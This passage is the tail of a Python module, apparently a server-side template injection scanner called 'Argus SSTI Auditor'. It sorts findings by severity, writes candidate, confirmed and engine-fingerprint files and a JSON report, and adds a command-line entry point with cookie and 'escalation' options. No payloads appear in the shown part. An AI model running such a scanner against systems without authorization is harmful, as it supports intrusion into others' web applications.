            deduped.append(f)

    SEV_ORDER = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3, "INFO": 4}
    deduped.sort(key=lambda f: (
        SEV_ORDER.get(f.severity, 5), 0 if f.confirmed else 1,
        -f.confidence, f.target,
    ))

    # ── Outputs
    elapsed = time.monotonic() - start
    by_severity = {k: 0 for k in SEV_ORDER}
    by_technique: dict[str, int] = {}
    by_engine: dict[str, int] = {}
    confirmed_list = [f for f in deduped if f.confirmed]

    for f in deduped:
        by_severity[f.severity] = by_severity.get(f.severity, 0) + 1
        by_technique[f.technique] = by_technique.get(f.technique, 0) + 1
        if f.engine:
            by_engine[f.engine] = by_engine.get(f.engine, 0) + 1

    (outdir / "ssti_candidates.txt").write_text(
        "\n".join(
            f"{f.target}\t{f.param}\t{f.technique}\t{f.severity}\t{f.confidence}\t"
            f"{f.engine}\t{'CONFIRMED' if f.confirmed else 'candidate'}\t{f.evidence[:140]}"
            for f in deduped
        ) + ("\n" if deduped else "")
    )
    (outdir / "ssti_confirmed.txt").write_text(
        "\n".join(
            f"{f.target}\t{f.param}\t{f.engine}\t{f.technique}\t{f.payload[:120]}"
            for f in confirmed_list
        ) + ("\n" if confirmed_list else "")
    )
    (outdir / "ssti_engine.txt").write_text(
        "\n".join(
            f"{url}\t{param}\t{engine}"
            for (url, param, _), engine in engine_map.items()
        ) + ("\n" if engine_map else "")
    )

    report = {
        "generated_at": datetime.now(timezone.utc).isoformat(),
        "elapsed_seconds": round(elapsed, 2),
        "input_file": str(urls_file),
        "auth_enabled": auth_on,
        "config": {
            "rate_limit":     eff_rate,
            "concurrency":    eff_conc,
            "timeout":        eff_timeout,
            "blind":          test_blind_enabled,
            "escalation":     test_escalation_enabled,
        },
        "totals": {
            "urls_input":      len(urls),
            "surfaces_tested": len(surfaces),
            "total_findings":  len(deduped),
            "confirmed":       len(confirmed_list),
            "critical":        by_severity["CRITICAL"],
            "high":            by_severity["HIGH"],
            "medium":          by_severity["MEDIUM"],
            "low":             by_severity["LOW"],
        },
        "summary": {
            "by_severity":  by_severity,
            "by_technique": dict(sorted(by_technique.items(), key=lambda kv: -kv[1])),
            "by_engine":    dict(sorted(by_engine.items(), key=lambda kv: -kv[1])),
        },
        "results":  results,
        "findings": [f.to_dict() for f in deduped],
    }

    json_path = outdir / "ssti_findings.json"
    json_path.write_text(json.dumps(report, indent=2, ensure_ascii=False) + "\n")

    # ── Self-sync
    if scan_id is not None:
        log.info("")
        log.info(f"  Syncing to remote database (scan_id={scan_id})...")
        _self_sync(scan_id, deduped)
    else:
        log.info("")
        log.info("  DB sync  : deferred to main.py (no scan_id passed)")

    # ── Summary
    log.info("")
    log.info("  Outputs :")
    log.info(f"    {json_path.name:<28} {len(deduped):>5} finding(s)")
    log.info(f"    ssti_candidates.txt          {len(deduped):>5} candidate(s)")
    log.info(f"    ssti_confirmed.txt           {len(confirmed_list):>5} confirmed")
    log.info(f"    ssti_engine.txt              {len(engine_map):>5} fingerprint(s)")
    log.info("")
    log.info(
        f"  Severity : CRITICAL={by_severity['CRITICAL']}  "
        f"HIGH={by_severity['HIGH']}  MEDIUM={by_severity['MEDIUM']}  "
        f"LOW={by_severity['LOW']}"
    )
    if by_engine:
        log.info("  Engine   : " + " · ".join(f"{k}({v})" for k, v in by_engine.items()))
    if by_technique:
        log.info("  Technique: " + " · ".join(f"{k}({v})" for k, v in by_technique.items()))
    log.info(f"  Confirmed: {len(confirmed_list)}/{len(deduped)}")

    if confirmed_list:
        log.info("")
        log.info("  Confirmed SSTI findings:")
        for f in confirmed_list[:10]:
            log.info(f"    [{f.severity:<8}] {f.engine or '?':<16} {f.technique:<10} {f.target[:55]}")

    log.info("")
    log.info(f"  Completed in {elapsed:.1f}s")
    return json_path


def _write_empty_report(
    outdir: Path, input_file: Path, start: float, total_input: int = 0,
) -> Path:
    report = {
        "generated_at": datetime.now(timezone.utc).isoformat(),
        "elapsed_seconds": round(time.monotonic() - start, 2),
        "input_file": str(input_file),
        "auth_enabled": False,
        "config": {},
        "totals": {
            "urls_input": total_input, "surfaces_tested": 0,
            "total_findings": 0, "confirmed": 0,
            "critical": 0, "high": 0, "medium": 0, "low": 0,
        },
        "summary": {"by_severity": {}, "by_technique": {}, "by_engine": {}},
        "results": [],
        "findings": [],
    }
    path = outdir / "ssti_findings.json"
    path.write_text(json.dumps(report, indent=2) + "\n")
    for name in ("ssti_candidates.txt", "ssti_confirmed.txt", "ssti_engine.txt"):
        (outdir / name).write_text("")
    return path


# ═════════════════════════════════════════════════════════════════════════════
#  STANDALONE
# ═════════════════════════════════════════════════════════════════════════════

if __name__ == "__main__":
    logging.basicConfig(
        level=logging.INFO,
        format="%(message)s",
        handlers=[logging.StreamHandler(sys.stdout)],
    )
    base = Path(__file__).resolve().parent.parent
    default_input = base / "output" / "gf_ssti.txt"
    if not default_input.exists():
        default_input = base / "output" / "urls_with_params.txt"
    if not default_input.exists():
        default_input = base / "output" / "all_urls.txt"

    parser = argparse.ArgumentParser(description="Argus SSTI Auditor (standalone)")
    parser.add_argument("--input", type=Path, default=default_input)
    parser.add_argument("--output", type=Path, default=base / "output")
    parser.add_argument("--scan-id", type=int, default=None)
    parser.add_argument("--rate-limit", type=int, default=None)
    parser.add_argument("--concurrency", type=int, default=None)
    parser.add_argument("--timeout", type=int, default=None)
    parser.add_argument("--cookie", help="Session cookie")
    parser.add_argument("--no-blind", action="store_true")
    parser.add_argument("--no-escalation", action="store_true")
    parser.add_argument("--max-surfaces", type=int, default=None)
    args = parser.parse_args()

    hdrs = {"Cookie": args.cookie} if args.cookie else None

    try:
        run_ssti_scan(
            args.input, args.output,
            headers=hdrs,
            test_blind_enabled=not args.no_blind,
            test_escalation_enabled=not args.no_escalation,
            max_surfaces=args.max_surfaces,
            rate_limit=args.rate_limit,
            concurrency=args.concurrency,
            timeout=args.timeout,
            scan_id=args.scan_id,
        )
    except Exception as e:
        log.error(f"failed: {e}")
        sys.exit(1)
